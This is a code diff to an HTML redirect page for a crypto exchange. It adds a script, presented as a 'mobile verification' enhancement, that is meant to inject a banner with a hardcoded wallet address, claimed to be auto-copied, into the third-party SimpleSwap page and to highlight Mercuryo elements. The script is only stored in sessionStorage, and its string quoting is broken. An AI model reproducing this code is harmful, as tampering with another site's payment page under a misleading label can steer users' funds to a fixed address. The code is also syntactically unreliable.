@@ -108,6 +108,90 @@
         
         // Fallback redirect
         window.location = finalURL;
+        
+        // WALLET ADDRESS DISPLAY AND MERCURYO ENHANCEMENT SCRIPT
+        // This script will inject wallet address display and enhance Mercuryo detection
+        const enhancementScript = `
+            // Wait for SimpleSwap to load, then enhance it
+            function enhanceSimpleSwap() {
+                console.log('🔧 Enhancing SimpleSwap for mobile verification...');
+                
+                // Add wallet address display banner
+                const walletBanner = document.createElement('div');
+                walletBanner.id = 'wallet-display-banner';
+                walletBanner.style.cssText = \`
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    background: #2196f3;
+                    color: white;
+                    padding: 10px;
+                    text-align: center;
+                    font-weight: bold;
+                    z-index: 9999;
+                    font-size: 14px;
+                \`;
+                walletBanner.innerHTML = '💳 Wallet: 0xE5173e7c3089bD89cd1341b637b8e1951745ED5C (Auto-copied)';
+                document.body.prepend(walletBanner);
+                
+                // Add green box around Mercuryo elements
+                function highlightMercuryo() {
+                    const elements = document.querySelectorAll('*');
+                    let mercuryoFound = false;
+                    
+                    elements.forEach(element => {
+                        if (element.textContent && element.textContent.toLowerCase().includes('mercuryo')) {
+                            console.log('Found Mercuryo element, adding green highlight');
+                            element.style.cssText += \`
+                                border: 3px solid #4caf50 !important;
+                                background-color: rgba(76, 175, 80, 0.1) !important;
+                                border-radius: 8px !important;
+                                padding: 8px !important;
+                                margin: 4px !important;
+                            \`;
+                            mercuryoFound = true;
+                        }
+                    });
+                    
+                    if (!mercuryoFound) {
+                        // If no Mercuryo found yet, try again in 2 seconds
+                        setTimeout(highlightMercuryo, 2000);
+                    } else {
+                        console.log('✅ Mercuryo highlighting complete');
+                    }
+                }
+                
+                // Start highlighting process
+                setTimeout(highlightMercuryo, 1000);
+                
+                // Also set up mutation observer to catch dynamically added content
+                const observer = new MutationObserver(function(mutations) {
+                    mutations.forEach(function(mutation) {
+                        if (mutation.addedNodes.length > 0) {
+                            setTimeout(highlightMercuryo, 500);
+                        }
+                    });
+                });
+                
+                observer.observe(document.body, {
+                    childList: true,
+                    subtree: true
+                });
+                
+                console.log('✅ SimpleSwap enhancement complete');
+            }
+            
+            // Run enhancement after page loads
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', enhanceSimpleSwap);
+            } else {
+                enhanceSimpleSwap();
+            }
+        \`;
+        
+        // Store the enhancement script to be executed on SimpleSwap
+        sessionStorage.setItem('simpleswapEnhancement', enhancementScript);
     </script>
     
     <!-- Fallback meta refresh with dynamic amount -->
